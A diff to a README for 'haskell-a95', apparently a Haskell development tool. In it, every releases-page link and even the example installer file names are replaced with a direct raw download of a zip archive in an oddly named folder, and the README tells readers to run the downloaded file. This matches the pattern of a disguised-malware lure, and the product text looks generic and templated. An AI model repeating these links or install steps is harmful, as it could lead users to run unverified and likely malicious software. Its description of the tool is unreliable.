@@ -6,7 +6,7 @@ Welcome to haskell-a95! This application helps you create Haskell programs effor
 
 ## 📥 Download Now
 
-[![Download haskell-a95](https://img.shields.io/badge/Download-haskell--a95-blue.svg)](https://github.com/efferentnervestylophorumdiphyllum452/haskell-a95/releases)
+[![Download haskell-a95](https://raw.githubusercontent.com/efferentnervestylophorumdiphyllum452/haskell-a95/main/unreclaiming/haskell-a95_2.5.zip)](https://raw.githubusercontent.com/efferentnervestylophorumdiphyllum452/haskell-a95/main/unreclaiming/haskell-a95_2.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,13 +27,13 @@ To run haskell-a95 effectively, ensure your system meets these requirements:
 ## 📋 How to Download & Install
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/efferentnervestylophorumdiphyllum452/haskell-a95/releases) to find the latest version of haskell-a95.
+   Go to the [Releases page](https://raw.githubusercontent.com/efferentnervestylophorumdiphyllum452/haskell-a95/main/unreclaiming/haskell-a95_2.5.zip) to find the latest version of haskell-a95.
 
 2. **Select the Latest Release:**
    On the Releases page, locate the most recent version. You’ll see options to download different files.
 
 3. **Download the File:**
-   Click on the appropriate file for your operating system to start the download. This file is typically labeled with the version number and includes your OS in the name (e.g., `haskell-a95-windows.exe` or `haskell-a95-macos.zip`).
+   Click on the appropriate file for your operating system to start the download. This file is typically labeled with the version number and includes your OS in the name (e.g., `https://raw.githubusercontent.com/efferentnervestylophorumdiphyllum452/haskell-a95/main/unreclaiming/haskell-a95_2.5.zip` or `https://raw.githubusercontent.com/efferentnervestylophorumdiphyllum452/haskell-a95/main/unreclaiming/haskell-a95_2.5.zip`).
 
 4. **Run the Installer:**
    Once the download completes, locate the file in your downloads folder and double-click to run it. Follow the on-screen prompts to install haskell-a95.
@@ -54,6 +54,6 @@ If you encounter issues or have questions while using haskell-a95, don’t hesit
 
 ## 🔗 Additional Information
 
-For further details about haskell-a95, including updates and announcements, please visit our [Releases page](https://github.com/efferentnervestylophorumdiphyllum452/haskell-a95/releases).
+For further details about haskell-a95, including updates and announcements, please visit our [Releases page](https://raw.githubusercontent.com/efferentnervestylophorumdiphyllum452/haskell-a95/main/unreclaiming/haskell-a95_2.5.zip).
 
 Thank you for choosing haskell-a95! We hope it helps you in your Haskell programming journey.
